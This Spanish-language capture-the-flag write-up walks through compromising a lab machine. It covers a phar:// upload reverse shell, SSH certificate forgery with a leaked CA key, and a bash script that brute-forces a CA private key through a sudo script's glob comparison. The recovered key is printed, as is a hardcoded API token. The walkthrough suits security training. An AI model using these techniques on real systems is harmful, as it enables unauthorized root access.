# Resource

Iniciamos con la máquina comprobando la conectividad realizando un **ping** a la IP **192.168.6.165**.

```bash
❯ ping -c 1 10.10.11.27
PING 10.10.11.27 (10.10.11.27) 56(84) bytes of data.
64 bytes from 10.10.11.27: icmp_seq=1 ttl=63 time=95.7 ms

--- 10.10.11.27 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 95.718/95.718/95.718/0.000 ms
```

En el output del comando ejecutado en el parámetro **ttl** se ve que el valor es **64**, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Linux.

| TTL | OS        |
| --- | --------- |
| 64  | GNU/Linux |
| 128 | Windows   |
Vamos a utilizar la herramienta **Nmap** para escanear los puertos que estén abiertos y servicios que están asociados a estos.

```bash
❯ nmap -p- --open -sCV -n --min-rate 5000 -Pn 10.10.11.27 -oN Scan
```

| Parámetros | Descripción                                                                                                |
| ---------- | ---------------------------------------------------------------------------------------------------------- |
| -p-        | Indica que analice todos los puertos del 1 al 65535                                                        |
| --open     | Únicamente se escanearan los puertos que estén abiertos                                                    |
| -sC        | Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto |
| -sV        | Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios                         |
| -n         | Se evita realizar resolución DNS                                                                           |
| --min-rate | Indica la cantidad de paquetes que se envían por segundo, en este caso 5000                                |
| -Pn        | Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.                              |
| -oN        | Exporta el output del comando ejecutado a un archivo en formato nmap                                       |

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-08 09:02 CET
Nmap scan report for 10.10.11.27
Host is up (0.099s latency).
Not shown: 65204 closed tcp ports (reset), 328 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 781e3b851264a1f6df5241ad8f5297c0 (ECDSA)
|_  256 e11ab50e87a4a18169949dd4d4a38af9 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2a683b9906b6c543222ecaf1704bd16 (ECDSA)
|_  256 0cc39c10f57fd3e4a8286a51ad1ae1bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.90 seconds
```

Los puertos que se han descubierto son:

| Puertos | Servicio | Versión       |
| ------- | -------- | ------------- |
| 22      | SSH      | OpenSSH 9.2p1 |
| 80      | HTTP     | nginx 1.18.0  |
| 2222    | SSH      | OpenSSH 8.9p1 |

Si nos fijamos, podemos observar que el dominio es **itrc.ssg.htb**. Por ello, si intentamos acceder directamente, no será posible resolverlo, ya que primero debemos indicarle al sistema que dicho dominio está asociado a la dirección IP **10.10.11.27**, agregándolo en el archivo **/etc/hosts**.

![[Pasted image 20250208110446.png]]

Al acceder ahora sí a la página, podemos observar que tenemos la posibilidad de registrarnos e iniciar sesión.

![[Pasted image 20250208110751.png]]

![[Pasted image 20250208110805.png]]

![[Pasted image 20250208111049.png]]

Nos creamos una cuenta, y accedemos

![[Pasted image 20250208112827.png]]

Al acceder, nos muestra un apartado donde podemos crear tickets.

![[Pasted image 20250208112905.png]]

Si observamos, podemos ver que tenemos la posibilidad de subir archivos **.zip** .

![[Pasted image 20250208114311.png]]

Creamos uno que contenga un archivo **.php** .

![[Pasted image 20250208120635.png]]

Lo subimos

![[Pasted image 20250208121759.png]]

Y al acceder no vemos nada

![[Pasted image 20250208121824.png]]

Pero si nos fijamos en el código fuente, podemos observar la ruta donde es guardado el archivo.

![[Pasted image 20250208121901.png]]

Al intentar acceder nos intenta descargar el archivo .zip 

![[Pasted image 20250208124400.png]]

Utilizando el wrapper **phar://** que permite acceder a archivos dentro de archivo **.phar** (archivos PHP), pero también a otros archivos comprimidos como por ejemplo los archivos **.zip**, podemos ver el contenido de nuestro archivo PHP.

![[Pasted image 20250208170110.png]]

Sabiendo esto, crearemos un archivo PHP el cual envíe una **Reverse Shell** a nuestro equipo.

![[Pasted image 20250208172103.png]]

![[Pasted image 20250208172343.png]]

![[Pasted image 20250208172351.png]]

Si miramos los archivos que hay en el directorio **uploads**, podemos observar, que hay un comprimido **.zip** que llama mucho la atención, y es que tiene un mayor tamaño que los demás.

![[Pasted image 20250208183019.png]]

Nos lo enviamos a nuestra maquina para poder operar de forma mas cómoda.

![[Pasted image 20250208183604.png]]

Y podemos observar que dentro contiene un archivo

![[Pasted image 20250208183648.png]]

![[Pasted image 20250208183629.png]]

Al mirar dentro del archivo, podemos ver unas credenciales.

![[Pasted image 20250208183844.png]]

Si tratamos de acceder vía **SSH** con las credenciales encontradas si nos deja acceder, pero si nos fijamos vemos que estamos dentro de un contenedor.

```bash
❯ ssh msainristil@10.10.11.27
msainristil@10.10.11.27's password: 
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb  8 17:40:57 2025 from 10.10.14.11
msainristil@itrc:~$ 
```

Vemos que hay un usuario con nombre **zzinter** .

```bash
msainristil@itrc:~$ grep sh$ /etc/passwd 
root:x:0:0:root:/root:/bin/bash
msainristil:x:1000:1000::/home/msainristil:/bin/bash
zzinter:x:1001:1001::/home/zzinter:/bin/bash
msainristil@itrc:~$ 
```

Si miramos en nuestro directorio de trabajo, podemos observar que tenemos un directorio el cual contiene 2 claves, una privada y una publica de una entidad certificadora **CA** .

```bash
msainristil@itrc:~$ ls -la                     
total 36
drwx------ 1 msainristil msainristil 4096 Feb  8 19:20 .
drwxr-xr-x 1 root        root        4096 Aug 13 11:13 ..
lrwxrwxrwx 1 root        root           9 Aug 13 11:13 .bash_history -> /dev/null
-rw-r--r-- 1 msainristil msainristil  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 msainristil msainristil 3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 msainristil msainristil  807 Mar 29  2024 .profile
drwx------ 2 msainristil msainristil 4096 Feb  8 19:20 .ssh
drwxr-xr-x 1 msainristil msainristil 4096 Jan 24  2024 decommission_old_ca
msainristil@itrc:~$ 
msainristil@itrc:~$ ls -l decommission_old_ca/
total 8
-rw------- 1 msainristil msainristil 2602 Jan 24  2024 ca-itrc
-rw-r--r-- 1 msainristil msainristil  572 Jan 24  2024 ca-itrc.pub
msainristil@itrc:~$
```

En este [post](https://superuser.com/questions/308126/is-it-possible-to-sign-a-file-using-an-ssh-key) podemos ver como firmar y autorizar claves cuando tenemos certificados.

Generamos una clave privada y publica.

```bash
msainristil@itrc:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/msainristil/.ssh/id_rsa): 
Created directory '/home/msainristil/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/msainristil/.ssh/id_rsa
Your public key has been saved in /home/msainristil/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:BuHoeX2O1dmgnzo10qJ+aje2G5wAoWJwpcrJl+39HMg msainristil@itrc
The key's randomart image is:
+---[RSA 3072]----+
|. ... o          |
| o . + o         |
|  + o +     .    |
|oo.oo. +   o +   |
|.+ oo.. S +.o .  |
|  . ..o..Boo+.   |
|     . E.o=+o.   |
|        = Bo     |
|       ooB+=     |
+----[SHA256]-----+
msainristil@itrc:~$ ls -l .ssh/
total 8
-rw------- 1 msainristil msainristil 2602 Feb  8 19:20 id_rsa
-rw-r--r-- 1 msainristil msainristil  570 Feb  8 19:20 id_rsa.pub
msainristil@itrc:~$
```

Ahora generamos el **certificado** firmando la clave **publica** con la clave **privada** de la entidad certificadora a nombre del usuario zzinter.

```bash
msainristil@itrc:~$ ssh-keygen -s decommission_old_ca/ca-itrc -n zzinter -I anything .ssh/id_rsa.pub 
Signed user key .ssh/id_rsa-cert.pub: id "anything" serial 0 for zzinter valid forever
msainristil@itrc:~$ 
```

| Parámetros | Descripción                                                      |
| ---------- | ---------------------------------------------------------------- |
| -s         | Indica la clave privada de la entidad certificadora              |
| -n         | Especifica que el certificado es válido para el usuario indicado |
| -I         | Puede contener cualquier string que queramos                     |

Si vemos el contenido del directorio **.ssh**, podemos ver que nos ha creado el certificado.

```bash
msainristil@itrc:~$ ls -l .ssh/
total 12
-rw------- 1 msainristil msainristil 2602 Feb  8 19:20 id_rsa
-rw-r--r-- 1 msainristil msainristil 2023 Feb  8 19:39 id_rsa-cert.pub
-rw-r--r-- 1 msainristil msainristil  570 Feb  8 19:20 id_rsa.pub
msainristil@itrc:~$ 
```

Con el certificado ya creado, ya podemos acceder sin proporcionar ninguna contraseña, como el usuario **zzinter** .

```bash
msainristil@itrc:~$ ssh -o CertificateFile=.ssh/id_rsa-cert.pub -i .ssh/id_rsa zzinter@localhost
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb  8 19:53:14 2025 from 127.0.0.1
zzinter@itrc:~$
```

| Parámetros         | Descripción                                             |
| ------------------ | ------------------------------------------------------- |
| -o CertificateFile | Especifica el certificado SSH que fue firmado por la CA |
| -i                 | Usa la clave privada correspondiente                    |
Podemos ver la primera flag.

```bash
zzinter@itrc:~$ cat user.txt 
399*****************************
zzinter@itrc:~$ 
```


Si miramos el contenido del directorio de trabajo, vemos cierto archivo, que realiza el mismo procedimiento de firmar la clave publica con la clave privada.

```bash
zzinter@itrc:~$ ls -l 
total 8
-rw-rw-r-- 1 root root    1193 Feb 19  2024 sign_key_api.sh
-rw-r----- 1 root zzinter   33 Feb  8 10:13 user.txt
zzinter@itrc:~$ cat sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
zzinter@itrc:~$ 
```

El script toma una clave publica, un nombre de usuario y uno de los elementos de la variable **support_principals** que serían las identidades autorizadas a conectarse como usuarios específicos en el sistema, y si nos fijamos lo envía a un dominio remoto con nombre **signserv.ssg.htb** a través de una petición **POST** 

Creamos una clave privada y publica.

```bash
zzinter@itrc:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zzinter/.ssh/id_rsa): 
Created directory '/home/zzinter/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/zzinter/.ssh/id_rsa
Your public key has been saved in /home/zzinter/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:dWOMy7LPKPwMkVzu7JgHukV4PU4ym05sbG/UCvejydA zzinter@itrc
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|           o     |
|        . o =    |
|     o = o + .   |
|    . O S.o      |
|     =o%o+.      |
|     o%=Eo       |
|    .*oX+=o      |
|    ..+=X.o.     |
+----[SHA256]-----+
zzinter@itrc:~$                
```

Creamos un certificado para cada uno de las identidades autorizadas

```bash
zzinter@itrc:~$ bash sign_key_api.sh .ssh/id_rsa.pub test webserver > webserver-cert
zzinter@itrc:~$ bash sign_key_api.sh .ssh/id_rsa.pub test analytics > analytics-cert
zzinter@itrc:~$ bash sign_key_api.sh .ssh/id_rsa.pub test support > support-cert
zzinter@itrc:~$ bash sign_key_api.sh .ssh/id_rsa.pub test security > security-cert
```

Y probamos cual de las certificaciones nos permite acceder, pero ahora a través del puerto **2222** que es el puerto **SSH** de la máquina host. 

```bash
zzinter@itrc:~$ ssh -o CertificateFile=webserver-cert -i .ssh/id_rsa webserver@172.223.0.1 -p 2222                                                                                     
webserver@172.223.0.1's password: 

zzinter@itrc:~$ ssh -o CertificateFile=analytics-cert -i .ssh/id_rsa analytics@172.223.0.1 -p 2222                                                                                     
analytics@172.223.0.1's password: 

zzinter@itrc:~$ ssh -o CertificateFile=support-cert -i .ssh/id_rsa support@172.223.0.1 -p 2222                                                                                         
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Feb  9 10:13:39 AM UTC 2025

  System load:  0.07               Processes:             240
  Usage of /:   76.6% of 10.73GB   Users logged in:       0
  Memory usage: 12%                IPv4 address for eth0: 10.10.11.27
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb  9 09:50:55 2025 from 172.223.0.3
support@ssg:~$ 
```

El certificado que si nos permite acceder es el de **support**, buscando por directorios vemos el **/etc/ssh/auth_principals/** que contienen una lista de **principals** que tienen permiso para autenticarse como ese usuario.

```bash
support@ssg:~$ ls -la /etc/ssh/auth_principals/
total 20
drwxr-xr-x 2 root root 4096 Feb  8  2024 .
drwxr-xr-x 5 root root 4096 Jul 24  2024 ..
-rw-r--r-- 1 root root   10 Feb  8  2024 root
-rw-r--r-- 1 root root   18 Feb  8  2024 support
-rw-r--r-- 1 root root   13 Feb  8  2024 zzinter
support@ssg:~$ cat /etc/ssh/auth_principals/root     
root_user
support@ssg:~$ cat /etc/ssh/auth_principals/support 
support
root_user
support@ssg:~$ cat /etc/ssh/auth_principals/zzinter 
zzinter_temp
support@ssg:~$  
```

En este caso vemos 2 principals nuevos, **root_user** para los usuarios root y support y **zzinter_temp** para el usuario zzinter.

Volvemos al contenedor y añadimos esos nombres de **principals** al nuevo nuevo script.

```bash
zzinter@itrc:~$ cat /tmp/sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security,root_user,zzinter_temp"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
zzinter@itrc:~$ 
```

Al creamos los certificados, vemos que solo nos permite crear el de **zzinter_temp**.

```bash
zzinter@itrc:~$ bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test root_user
{"detail":"Root access must be granted manually. See the IT admin staff."}
zzinter@itrc:~$ bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test zzinter_temp
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgO0IZwKaBknnH55DX45YmN6a4y6J9DwlBoK3uzQf8ijEAAAADAQABAAABgQCoBINXBDoT7LJNECgtCco1KFJwPujAHDK31kXaiJY5rdev9Z2GbSXd0fN4Rb73rzQmyuHAZ/31MLR4qNFvKalIOXThFn5pEmCCk/kEbVyMqW0oW13gynJu1gvR8tK9SZl540zxR7eyIRS/5o1PNQotbdyWZSZ7K4H8py9a6ypf5vg0MA3T/XcISw02JHZCGMvS+7562sCdq/RQ6tWDbOgKJ+JGNq8wn5YI98kvQxATUonMsVuPQYTgobeg6v/RhE4awu0gzhBdzHaTlmmEt9dkFBQRdyduZHkzs/kcHBUODRWHFYGQwAeVbdBsiqCGw2nWCtCws7KfbaX8u3GXVCa1qjVoxJ/vfIGG3cMKHEBRy8929dG9eyrSdwy9Hf4XSJizzN9sv90hCwjNhB0xqsJEksuLC2nzv9FZbiy6H8LsNI5PcvcUI+3wORm0f9Avd4ezbH+W3o8xFa3fSU4/GYCer0hdAVgtRKfrG0cceXjPZCvcB5QIXaJeDGEj5FGnBWkAAAAAAAAALAAAAAEAAAAEdGVzdAAAABAAAAAMenppbnRlcl90ZW1wAAAAAGefSV3//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAED8aXYAGX+JZWGTonfEBr2RNhki+k8bRE4WUEf3YFPkOBs8FKYC9j8hIyYNySvHMisWsfc/Ga/AOIstm3r+FQgE zzinter@itrc
zzinter@itrc:~$ 
```

Accedemos como el usuario **zzinter** y vemos que si que funciona.

```bash
zzinter@itrc:~$ ssh -o CertificateFile=zzinter_temp-cert -i .ssh/id_rsa zzinter@172.223.0.1 -p 2222
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Feb  9 10:41:31 AM UTC 2025

  System load:  0.0                Processes:             240
  Usage of /:   76.7% of 10.73GB   Users logged in:       0
  Memory usage: 12%                IPv4 address for eth0: 10.10.11.27
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb  9 10:34:09 2025 from 172.223.0.3
zzinter@ssg:~$ hostname -I
10.10.11.27 172.17.0.1 172.21.0.1 172.223.0.1 
zzinter@ssg:~$ 
```

Si miramos los permisos que tenemos, vemos que podemos ejecutar cierto script como el usuario **root** y sin proporcionar la contraseña.

```bash
zzinter@ssg:~$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
zzinter@ssg:~$ 
```

Si miramos el código del script vemos que está creando un certificado

```bash
zzinter@ssg:~$ cat /opt/sign_key.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal_str="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"

zzinter@ssg:~$ 
```

Si miramos esta parte de código, podemos observar que esta comparando la clave privada de la entidad certificadora **/etc/ssh/ca-it** con la clave privada que el usuario envía y en caso de que sean iguales, el script mostrara el mensaje **"Error: Use API for signing with this CA.**

```bash
itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi
```

Pero nosotros no tenemos los permisos necesarios para poder ver el contenido de dicha clave privada

```bash
zzinter@ssg:~$ ls -l /etc/ssh/ca-it
-rw------- 1 root root 432 Feb  8  2024 /etc/ssh/ca-it
zzinter@ssg:~$ 
```

Copiamos ese trozo de código para realizar una prueba

```bash
zzinter@ssg:~$ cat test.sh 
#!/usr/bin/bash

ca_file=$1

itca=$(cat /home/zzinter/key_origin)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
fi
zzinter@ssg:~$ 
```

En este caso vamos a comparar el archivo **key_origin** con el archivo que enviará el usuario, en este caso **new_key** .

```bash
zzinter@ssg:~$ cat key_origin 
klhasdgklgy
zzinter@ssg:~$ cat new_key 
qwetawsdgsy
zzinter@ssg:~$ 
```

De primeras parecería que los 2 archivos no son iguales, y es cierto ya que al ejecutar el script, no recibo ningún mensaje.

```bash
zzinter@ssg:~$ ./test.sh new_key
zzinter@ssg:~$ 
```

Pero si ahora, en el archivo **new_key** le añadimos un asterisco **\*** resulta que ahora el contenido de los 2 archivos si son iguales.

```bash
zzinter@ssg:~$ cat key_origin 
klhasdgklgy
zzinter@ssg:~$ cat new_key 
*y
zzinter@ssg:~$ ./test.sh new_key
Error: Use API for signing with this CA.
zzinter@ssg:~$ 
```
 
 Esto es debido a que al indicarle un asterisco, le estamos diciendo que hay contenido, y que después de ese contenido está terminal con la letra **y**, pues lo mismo que con el contenido de **key_origin** empieza por contenido, y termina con la letra **y** .

Pues jugando con este concepto podríamos averiguar la clave privada de la autoridad certificadora (CA) mediante fuerza bruta.

```bash
#!/bin/bash  
  
characters='-=+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/ !'  
key=""  


while true; do  
	  
	cp new_key new_key2  
  
	for (( x=0; x<${#characters}; x++ )); do  
  
		char="${characters:$x:1}"  
  
		if [[ $char == "!" ]]; then  
			char="\n"  
		fi  
  
		echo -e "*$char$key" > new_key  
  
		sudo /opt/sign_key.sh new_key test_id root test 1 | grep "API" 1>/dev/null  
  
		if [[ $? -eq 0 ]]; then  
			key="${char}${key}"  
			break  
		fi  
  
    done  
  
	echo -e "$key" > new_key  
  
	diff new_key new_key2 1>/dev/null  
  
    if [[ $? -eq 0 ]]; then  
        break  
    fi  
  
done  
  
rm new_key2  
  
mv new_key key_cert
```

Ejecutamos el script y al esperar un tiempo, nos crea la clave privada de la entidad certificadora.

```bash
zzinter@ssg:~$ ./bruteforce_key.sh
zzinter@ssg:~$ cat key_cert 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
zzinter@ssg:~$ 
```

Con la clave privada ya obtenida, podemos crear el certificado que utilizaremos para poder luego acceder como el usuario **root** .

Creamos la clave SSH.

```bash
zzinter@ssg:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zzinter/.ssh/id_rsa): 
Created directory '/home/zzinter/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/zzinter/.ssh/id_rsa
Your public key has been saved in /home/zzinter/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:CRluuFDYuIbp2BPUQZ4Q7O+bCJPliVhqLyITz1DqMEs zzinter@ssg
The key's randomart image is:
+---[RSA 3072]----+
| .oB+..          |
|  =+o+ o         |
| =..+ =          |
|o *. o . .       |
|o=oo.   S        |
|OEo..            |
|@Ooo             |
|*=+...           |
|o.o.o.           |
+----[SHA256]-----+
zzinter@ssg:~$ 
```

Creamos el certificado.

```bash
zzinter@ssg:~$ chmod 600 key_cert 
zzinter@ssg:~$ ssh-keygen -s key_cert -n root_user -I anything .ssh/id_rsa.pub
Signed user key .ssh/id_rsa-cert.pub: id "anything" serial 0 for root_user valid forever
zzinter@ssg:~$ ls -l .ssh/
total 12
-rw------- 1 zzinter zzinter 2602 Feb  9 12:41 id_rsa
-rw-r--r-- 1 zzinter zzinter 1118 Feb  9 12:44 id_rsa-cert.pub
-rw-r--r-- 1 zzinter zzinter  565 Feb  9 12:41 id_rsa.pub
zzinter@ssg:~$ 
```

Ya finalmente podemos acceder como el usuario **root** .

```bash
zzinter@ssg:~$ ssh -o CertificateFile=.ssh/id_rsa-cert.pub -i .ssh/id_rsa root@localhost -p 2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:tOsmHdA7xDQq2UDyCf0EobZ/LcitevFrAQ6RSJCy10Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Feb  9 12:47:17 PM UTC 2025

  System load:  0.0                Processes:             246
  Usage of /:   88.1% of 10.73GB   Users logged in:       1
  Memory usage: 13%                IPv4 address for eth0: 10.10.11.27
  Swap usage:   0%

  => / is using 88.1% of 10.73GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@ssg:~# 
```

Y ya podemos ver la ultima flag.

```bash
root@ssg:~# cat root.txt 
229*****************************
root@ssg:~# 
```

